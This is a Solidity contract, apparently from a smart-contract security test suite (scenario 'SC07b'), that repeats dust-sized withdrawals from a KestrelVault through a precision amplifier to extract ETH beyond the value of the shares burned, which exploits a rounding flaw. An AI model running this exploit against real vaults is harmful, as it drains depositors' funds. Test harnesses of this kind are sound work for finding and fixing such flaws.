// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { KestrelVault } from "kestrel/KestrelVault.sol";
import { PrecisionAmplifier, IAmplifiedOperation } from "../helpers/PrecisionAmplifier.sol";
import { VaultWithdrawOp } from "../helpers/AmplifiedOps.sol";

/// @notice SC07b attacker: drives the {PrecisionAmplifier} over dust vault withdrawals and
///         reports how much ETH left the vault beyond the value of the shares burned.
contract DustWithdrawAttacker {
    /// @notice Operation id used with the amplifier.
    bytes32 public constant OP = keccak256("vault.withdraw.dust");
    /// @notice The amplifier.
    PrecisionAmplifier public immutable amplifier;
    /// @notice The dust-withdrawal operation (holds the attacker's shares).
    VaultWithdrawOp public immutable op;

    /// @param vault Target vault.
    constructor(KestrelVault vault) {
        amplifier = new PrecisionAmplifier();
        op = new VaultWithdrawOp(vault);
    }

    /// @notice Buy shares with `msg.value`.
    function fund() external payable {
        op.fund{ value: msg.value }();
    }

    /// @notice Withdraw `amount` wei `n` times.
    /// @param n Repetitions.
    /// @param amount Wei per withdrawal.
    /// @return extracted Wei taken beyond the value of the burned shares.
    function run(uint256 n, uint256 amount) external returns (uint256 extracted) {
        extracted = amplifier.amplify(OP, IAmplifiedOperation(address(op)), n, amount);
    }
}
